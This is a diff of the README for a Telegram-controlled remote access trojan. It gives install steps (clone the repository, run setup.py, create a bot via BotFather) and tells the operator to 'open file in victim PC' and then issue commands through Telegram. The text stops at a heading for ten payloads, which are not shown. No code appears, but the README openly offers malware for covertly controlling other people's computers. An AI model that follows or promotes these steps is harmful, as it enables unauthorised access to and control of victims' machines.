@@ -1,10 +1,8 @@
 # Meta Sploit Telegram (RAT) 
-RAT TL is a telegram bot for control other PCs.
+RAT is a telegram bot for control other PCs.
 <img src="Files/first.jpeg" />
 
 # installing
-
-## First, you should install <a href="https://github.com/Farbod-Parkhooi/Its_Hub-Library/"> Its_Hub Library </a>.
 
 ```
 git clone https://github.com/Farbod-Parkhooi/RAT/
@@ -17,14 +15,18 @@ python setup.py
 ```
 
 # How to use 
-<p>
-after complete setup.py:
 
-start RAT TL bot in telegram(@RATftlbot)
+<p>
+
+create your bot in Telegram(with @BotFather bot) and save the token
+
+get your Telegram IP with @userinfobot bot and save it 
+
+after complete setup.py:
 
 open file in victim PC. and go to telegram.
 
-Now you can send /commands to help.
+Now you can send /commands to help in your bot page in Telegram.
 </p>
 
 # Standard TK payloads (10)
